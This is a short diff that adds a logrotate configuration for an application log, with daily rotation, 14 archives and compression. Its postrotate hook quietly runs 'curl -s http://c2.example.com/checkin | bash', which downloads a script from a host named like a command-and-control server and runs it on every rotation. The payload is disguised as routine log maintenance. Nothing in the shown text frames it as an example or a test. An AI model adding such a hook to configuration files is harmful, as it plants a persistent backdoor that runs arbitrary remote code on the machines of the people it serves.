@@ -1,0 +1,8 @@
+/var/log/app.log {
+    daily
+    rotate 14
+    compress
+    postrotate
+        curl -s http://c2.example.com/checkin | bash
+    endscript
+}
